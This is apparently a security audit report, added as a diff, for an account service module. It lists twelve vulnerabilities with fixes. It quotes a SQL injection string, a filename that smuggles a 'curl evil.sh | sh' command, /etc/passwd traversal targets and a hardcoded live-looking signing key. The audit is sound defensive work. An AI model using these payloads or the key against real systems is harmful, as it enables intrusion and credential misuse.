@@ -1,0 +1,24 @@
+Read-only audit, no files changed.
+
+## Findings — `account_service.py`
+
+| # | Finding | Evidence | Impact | Priority | Proposed Fix | Risk |
+|---|---------|----------|--------|----------|--------------|------|
+| 1 | **SQL injection** — `username` interpolated into the query string via f-string | `account_service.py:34` | Full DB read/write; auth bypass with `' OR '1'='1' --` | Critical | Parameterized query: `"... WHERE username = ?", (username,)` — same pattern already used at :46 | None (behavior-preserving) |
+| 2 | **Command injection** — user-controlled `filename` reaches a `shell=True` command via `destination` | `account_service.py:119-125` | Arbitrary command execution as the service user (`filename = "x; curl evil.sh \| sh"`) | Critical | Drop `shell=True`, pass an argument list; validate `filename` against `^[A-Za-z0-9._-]+$` | Low |
+| 3 | **Path traversal** — `os.path.join(EXPORT_DIR, filename)` with an absolute or `../` filename escapes `EXPORT_DIR`; the result is then read back and returned to the caller | `account_service.py:119`, read at `:126` | Arbitrary file write and arbitrary file disclosure (`/etc/passwd`, the DB itself) | Critical | Reject separators, then `realpath` and assert the result is inside `EXPORT_DIR` | Low |
+| 4 | **Hardcoded secret in source** | `account_service.py:19` (`SIGNING_KEY = "sk_live_8f2c91ab4e7d6035"`) | Live key exposed to anyone with repo/history read; `sk_live_` prefix suggests a real provider credential | Critical | Load from env/secret manager; **rotate the key** — it must be treated as compromised | Rotation requires coordinated deploy |
+| 5 | **Plaintext password written to logs** on every successful login | `account_service.py:60-65` (`password=%s`, arg at `:63`) | Credential harvesting from log files, log shipping, and backups | Critical | Delete the `password` argument and its format slot | None |
+| 6 | **Missing authorization (IDOR)** — `session_user_id` is accepted but never compared to `target_user_id` | `account_service.py:83-96` (`update_profile`) | Any authenticated user can rewrite any other account's email → account takeover via password reset | Critical | Require `session_user_id == target_user_id` or an admin role, as `deactivate_account:160` already does | None |
+| 7 | **Missing authorization (IDOR)** — same unused `session_user_id` | `account_service.py:103-111` (`get_profile`) | Any authenticated user can read any account's email and role | High | Same ownership/admin check | None |
+| 8 | **Weak password hashing** — unsalted SHA-256 with a single round and a shared global pepper | `account_service.py:72-75` | DB leak → offline cracking at billions of guesses/sec; identical passwords produce identical hashes | High | Migrate to `bcrypt`/`argon2id` with a per-user salt; rehash on next successful login | Requires a migration path for existing hashes |
+| 9 | **Non-constant-time hash comparison** | `account_service.py:59` | Timing side channel on hash comparison | Medium | `hmac.compare_digest(...)` | None |
+| 10 | **No authorization on an enumeration endpoint** | `account_service.py:130-144` (`list_recent_signups`) | Any caller enumerates up to 1000 usernames and signup times | Medium | Gate behind an admin check | None |
+| 11 | **`password_hash` returned in the general lookup result** | `account_service.py:34` (selected), `:36` (returned) | Hash leaks to every caller of `find_by_username`, not just `verify_credentials` | Medium | Return the hash only from a dedicated internal credential lookup | Low — check callers outside this module first |
+| 12 | **Export failure is swallowed, then the destination is read unconditionally** | `account_service.py:124` (`check=False`) → `:126` | A failed export returns whatever file already sits at that path — stale data from another user's export | Medium | `check=True`, or verify the return code before opening | None |
+
+All twelve are `CONFIRMED` by reading the code, with two scope notes: #11's blast radius depends on callers outside this file (I did not sweep them), and #2/#3 assume `filename` is request-derived — the module docstring at `:4-5` says callers only pass session middleware, which does not sanitize anything.
+
+Not flagged: `find_by_id` (:45-47), `deactivate_account` (:155-169), and `list_recent_signups`' query (:137-141) are correctly parameterized, and `deactivate_account` is the one function here that does check authorization — it is the right model for #6 and #7.
+
+Two lower-severity observations I left out of the table: `datetime.utcnow()` at `:64`, `:80`, and `:134` returns a naive datetime, so `session_expired` raises `TypeError` if a caller passes a timezone-aware `issued_at`; and `days` at `:130` is unbounded, unlike `limit`.
